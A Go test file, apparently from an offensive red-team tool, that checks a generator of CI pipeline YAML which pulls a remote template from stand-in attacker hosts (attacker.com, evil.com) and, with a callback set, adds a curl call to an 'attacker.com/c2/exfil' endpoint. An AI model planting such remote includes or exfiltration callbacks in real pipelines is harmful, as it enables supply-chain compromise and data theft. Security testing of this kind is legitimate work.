package payloads

import (
	"strings"
	"testing"
)

func TestGenerateRemoteIncludeCacheYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     RemoteIncludeCacheOptions
		contains []string
		absent   []string
	}{
		{
			name: "default remote include cache",
			opts: RemoteIncludeCacheOptions{},
			contains: []string{
				"include:",
				"remote: https://attacker.com/ci-template.yml",
				`cache: "1h"`,
				"cache-seed:",
				"allow_failure: true",
			},
			absent: []string{
				"curl",
			},
		},
		{
			name: "custom URL and TTL",
			opts: RemoteIncludeCacheOptions{
				RemoteURL: "https://evil.com/inject.yml",
				CacheTTL:  "24h",
			},
			contains: []string{
				"remote: https://evil.com/inject.yml",
				`cache: "24h"`,
			},
		},
		{
			name: "with callback",
			opts: RemoteIncludeCacheOptions{
				CallbackURL: "https://attacker.com/c2",
			},
			contains: []string{
				"curl",
				"https://attacker.com/c2/exfil",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GenerateRemoteIncludeCacheYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			for _, s := range tc.absent {
				if strings.Contains(y, s) {
					t.Errorf("unexpected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
